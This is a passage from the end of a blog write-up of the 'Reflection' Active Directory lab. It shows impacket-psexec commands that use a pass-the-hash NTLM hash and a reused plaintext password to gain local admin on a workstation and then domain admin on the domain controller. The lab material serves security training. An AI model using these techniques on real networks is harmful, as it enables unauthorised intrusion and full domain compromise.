+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-psexec WS01/Administrator@10.10.166.199 -hashes <span class="string">&quot;:a29542cb2707bf6d6c1d2c9311b0ff02&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>Having access to WS01 as the local admin, we found the flag on <code>Rhys.Garner</code> Desktop folder </p>
+<p><img src="/img/Reflection/Pasted%20image%2020241128151502.png"></p>
+<h2 id="DC01"><a href="#DC01" class="headerlink" title="DC01"></a>DC01</h2><p>Searching for Rhys.Garner user on bloodhound didn’t help us  find the next step to become DA. However, another user has the same last name <code>DOM_RGARNER</code> :</p>
+<p><img src="/img/Reflection/Pasted%20image%2020241128152406.png"></p>
+<p>And to our surprise that other user <code>DOM_RGARNER</code>  has the same password and is a domain admin. </p>
+<p><img src="/img/Reflection/Pasted%20image%2020241128152647.png"></p>
+<p>So, the next step is to get a foothold into the DC</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-psexec reflection.vl/DOM_RGARNER:<span class="string">&quot;knh1gJ8Xmeq+uP&quot;</span>@10.10.166.197</span><br></pre></td></tr></table></figure>
+
+<p>And we get the last flag<br><img src="/img/Reflection/Pasted%20image%2020241128152954.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://cyberkmz.github.io">Mohamed Khalil Mzali</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://cyberkmz.github.io/2024/11/28/ReflectionChainWriteup/">https://cyberkmz.github.io/2024/11/28/ReflectionChainWriteup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/Reflection/reflection.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/11/26/TrustedChainWriteup/" title="Trusted AD Chain VulnLab - Writeup"><img class="cover" src="/img/Trusted/trusted_slide.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next</div><div class="next_info">Trusted AD Chain VulnLab - Writeup</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/CyberKMZ.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mohamed Khalil Mzali</div><div class="author-info__description">Cyber Security Student</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/CyberKMZ"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/CyberKMZ" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:cyber.mzali@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/khalil-mzali/" target="_blank" title=""><i class="fab fa-linkedin-in"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Welcome to my blog where I post about writeups and articles.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MSSQL-enumeration"><span class="toc-number">1.</span> <span class="toc-text">MSSQL enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-enumeration"><span class="toc-number">2.</span> <span class="toc-text">Domain enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LAPS"><span class="toc-number">3.</span> <span class="toc-text">LAPS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MS01"><span class="toc-number">4.</span> <span class="toc-text">MS01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RBCD"><span class="toc-number">5.</span> <span class="toc-text">RBCD</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WS01"><span class="toc-number">6.</span> <span class="toc-text">WS01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DC01"><span class="toc-number">7.</span> <span class="toc-text">DC01</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/11/28/ReflectionChainWriteup/" title="Reflection AD Chain VulnLab - Writeup"><img src="/img/Reflection/reflection.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Reflection AD Chain VulnLab - Writeup"/></a><div class="content"><a class="title" href="/2024/11/28/ReflectionChainWriteup/" title="Reflection AD Chain VulnLab - Writeup">Reflection AD Chain VulnLab - Writeup</a><time datetime="2024-11-27T23:00:00.000Z" title="Created 2024-11-28 00:00:00">2024-11-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/26/TrustedChainWriteup/" title="Trusted AD Chain VulnLab - Writeup"><img src="/img/Trusted/trusted_slide.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Trusted AD Chain VulnLab - Writeup"/></a><div class="content"><a class="title" href="/2024/11/26/TrustedChainWriteup/" title="Trusted AD Chain VulnLab - Writeup">Trusted AD Chain VulnLab - Writeup</a><time datetime="2024-11-25T23:00:00.000Z" title="Created 2024-11-26 00:00:00">2024-11-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/15/BabyWriteup-Vulnlab/" title="Baby VulnLab - Writeup"><img src="/img/Baby/baby_vulnlab.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Baby VulnLab - Writeup"/></a><div class="content"><a class="title" href="/2024/08/15/BabyWriteup-Vulnlab/" title="Baby VulnLab - Writeup">Baby VulnLab - Writeup</a><time datetime="2024-08-14T23:00:00.000Z" title="Created 2024-08-15 00:00:00">2024-08-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/15/FeedBackWriteup-Vulnlab/" title="FeedBack VulnLab - Writeup"><img src="/img/Feedback/feedback_vulnlab.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="FeedBack VulnLab - Writeup"/></a><div class="content"><a class="title" href="/2024/08/15/FeedBackWriteup-Vulnlab/" title="FeedBack VulnLab - Writeup">FeedBack VulnLab - Writeup</a><time datetime="2024-08-14T23:00:00.000Z" title="Created 2024-08-15 00:00:00">2024-08-15</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/Reflection/reflection.png')"><div id="footer-wrap"><div class="copyright">&copy;2024 By Mohamed Khalil Mzali</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
